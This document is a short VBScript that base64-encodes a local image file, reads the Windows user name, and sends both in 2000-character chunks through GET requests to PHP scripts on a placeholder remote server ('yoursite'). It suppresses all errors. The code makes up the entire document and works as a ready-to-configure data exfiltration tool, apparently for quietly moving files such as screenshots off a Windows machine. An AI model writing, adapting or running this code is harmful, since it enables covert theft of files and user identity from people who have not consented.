On Error Resume Next
'Dir of server (without a "/" at the end)
server = "https://yoursite/dir"
'Folder in the dir of server where store the mechanism. Default is /comm/
path = "/comm/"

Public Function convertImageToBase64(filePath)
  Dim inputStream
  Set inputStream = CreateObject("ADODB.Stream")
  inputStream.Open
  inputStream.Type = 1  ' adTypeBinary
  inputStream.LoadFromFile filePath
  Dim bytes: bytes = inputStream.Read
  Dim dom: Set dom = CreateObject("Microsoft.XMLDOM")
  Dim elem: Set elem = dom.createElement("tmp")
  elem.dataType = "bin.base64"
  elem.nodeTypedValue = bytes
  convertImageToBase64 = Replace(elem.text, vbLf, "")
End Function

'Puts each character of the string in an element of an array: arrChars
inputString = convertImageToBase64("filename.png")
intLen = Len(inputString)-1
redim arrChars(intLen)
For intCounter = 0 to intLen
	arrChars(intCounter) = Mid(inputString, intCounter + 1,1)
Next

Set WshNetwork = WScript.CreateObject("WScript.Network")
'Name of the Windows user
uname = Replace(WshNetwork.UserName, " ", "_")


Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP")

'Warns the server that transfer is started (o = 1 Start; o = 2 End)
url = server & path & "save.php?o=1"
xmlhttp.open "GET", url, 0
xmlhttp.send ""


WScript.Sleep 2000

'Send text in packets of 2000 character (PHP limit is 20148)
counter = 0
lun = ubound(arrChars)

Do While counter < lun + 1
	'I suggest to keep this sleep in order to not stress the php server
	WScript.Sleep 100
	
	'temp contains the packets
	temp = ""
	if counter + 2000 < lun then
		for i = counter to counter + 2000
			temp = temp & arrChars(i)
		Next
	else
		for i = counter to lun
			temp = temp & arrChars(i)
		Next
	end if
	url = server & path & "buffer.php?piece=" & temp
	xmlhttp.open "GET", url, 0
	xmlhttp.send ""
	
	counter = counter + 2001
Loop

WScript.Sleep 2000

'Warns server that transfer is ended. So it has to convert text to image
url = server & path & "save.php?o=2&user=" & uname
xmlhttp.open "GET", url, 0
xmlhttp.send ""